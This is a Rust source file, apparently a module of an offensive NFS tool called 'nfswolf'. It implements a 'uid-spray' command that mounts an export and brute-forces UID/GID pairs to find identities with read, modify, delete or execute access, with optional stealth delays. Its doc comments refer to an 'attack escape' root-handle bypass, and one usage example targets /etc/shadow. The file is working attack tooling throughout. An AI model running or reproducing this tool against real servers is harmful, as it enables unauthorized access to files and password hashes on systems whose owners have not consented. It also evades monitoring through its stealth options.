//! UID/GID brute-force as a last-resort credential discovery tool.
//!
//! Most of the time you should NOT need this: `shell` and `mount` already
//! run an automatic credential ladder (owner -> root -> common service
//! UIDs) on every NFS3ERR_ACCES, and `attack escape` produces a root
//! handle that bypasses export-level access checks entirely. Reach for
//! `uid-spray` only when both of those have failed and you genuinely need
//! to enumerate the UID/GID space against a single path -- typically to
//! confirm whether an export is truly inaccessible or to map which
//! identities the server happens to recognise.

use clap::Parser;
use colored::Colorize as _;

use crate::cli::probe::{lookup_path, make_client, make_mount_client, parse_addr};
use crate::cli::{GlobalOpts, H_BEHAVIOR, H_IDENTITY, H_STEALTH, H_TARGET};
use crate::engine::uid_sprayer::{SprayConfig, UidSprayer, access_bits};
use crate::util::stealth::StealthConfig;

/// Spray UID/GID combinations to find which identities can access a path.
///
/// Last-resort credential discovery. This should not normally be needed:
/// the auto-UID ladder built into `shell` and `mount` already tries owner,
/// root, and common service UIDs on every ACCES, and `escape` bypasses
/// export-level access checks entirely. `uid-spray` is included as a
/// fallback when those don't pin down a working credential.
///
/// Examples:
///   nfswolf uid-spray 192.168.1.10:/srv --uid-start 0 --uid-end 5000
///   nfswolf uid-spray 192.168.1.10:/srv --path /etc/shadow --aux-gids 42,15
#[derive(Parser)]
pub struct UidSprayArgs {
    /// Target host with optional :/export suffix (e.g. 10.0.0.5:/srv)
    #[arg(help_heading = H_TARGET, value_name = "TARGET")]
    pub target: String,

    /// Export path (alternative to host:/export in the positional target)
    #[arg(short = 'e', long, help_heading = H_TARGET)]
    pub export: Option<String>,

    /// UID range start
    #[arg(long, default_value = "0", help_heading = H_IDENTITY)]
    pub uid_start: u32,

    /// UID range end
    #[arg(long, default_value = "65535", help_heading = H_IDENTITY)]
    pub uid_end: u32,

    /// GID range start
    #[arg(long, default_value = "0", help_heading = H_IDENTITY)]
    pub gid_start: u32,

    /// GID range end
    #[arg(long, default_value = "65535", help_heading = H_IDENTITY)]
    pub gid_end: u32,

    /// Path to check access against
    #[arg(long, default_value = "/", help_heading = H_BEHAVIOR)]
    pub path: String,

    /// Delay between attempts in ms (independent of global --delay)
    #[arg(long, default_value = "0", help_heading = H_STEALTH)]
    pub attempt_delay: u64,
}

/// Run the uid-spray command.
pub async fn run(args: UidSprayArgs, globals: &GlobalOpts) -> anyhow::Result<()> {
    let target = crate::cli::target::parse(&args.target, args.export.as_deref(), None, true)?;
    let host = target.host.to_string();
    let export = target.export().unwrap_or("/").to_owned();

    let stealth = StealthConfig::new(globals.delay, globals.jitter);

    eprintln!("{}", format!("[*] Spraying UIDs {}-{} on {host}:{export}", args.uid_start, args.uid_end).yellow());

    let addr = parse_addr(&host)?;
    let (_, circuit, client) = make_client(addr, &export, 0, 0, &globals.aux_gids, stealth.clone());

    // Mount to get the root handle, then walk to the target path.
    let mount = make_mount_client(globals);
    let mnt = mount.mount(addr, &export).await?;
    let target_fh = if args.path == "/" {
        mnt.handle
    } else {
        let (_, _, lookup_client) = make_client(addr, &export, 0, 0, &globals.aux_gids, stealth.clone());
        lookup_path(&lookup_client, &mnt.handle, &args.path).await?
    };

    let sprayer = UidSprayer::new(client, circuit, stealth.clone());
    let config = SprayConfig { uid_range: args.uid_start..=args.uid_end, gid_range: args.gid_start..=args.gid_end, auxiliary_gids: globals.aux_gids.clone(), target_path: args.path, concurrency: 1, required_access: access_bits::ALL, per_attempt_delay_ms: args.attempt_delay };

    let results = sprayer.spray(&config, &target_fh).await;
    eprintln!("{}", format!("[+] {} credential(s) granted access", results.len()).green());
    for r in &results {
        let flags = access_summary(r.access);
        eprintln!("    uid={} gid={} [{flags}]", r.uid, r.gid);
    }

    crate::cli::emit_replay(globals);
    Ok(())
}

/// Produce a compact access summary string from an access bitmask.
fn access_summary(access: u32) -> String {
    let mut flags = Vec::with_capacity(6);
    if access & access_bits::READ != 0 {
        flags.push("READ");
    }
    if access & access_bits::LOOKUP != 0 {
        flags.push("LOOKUP");
    }
    if access & access_bits::MODIFY != 0 {
        flags.push("MODIFY");
    }
    if access & access_bits::EXTEND != 0 {
        flags.push("EXTEND");
    }
    if access & access_bits::DELETE != 0 {
        flags.push("DELETE");
    }
    if access & access_bits::EXECUTE != 0 {
        flags.push("EXECUTE");
    }
    flags.join("|")
}
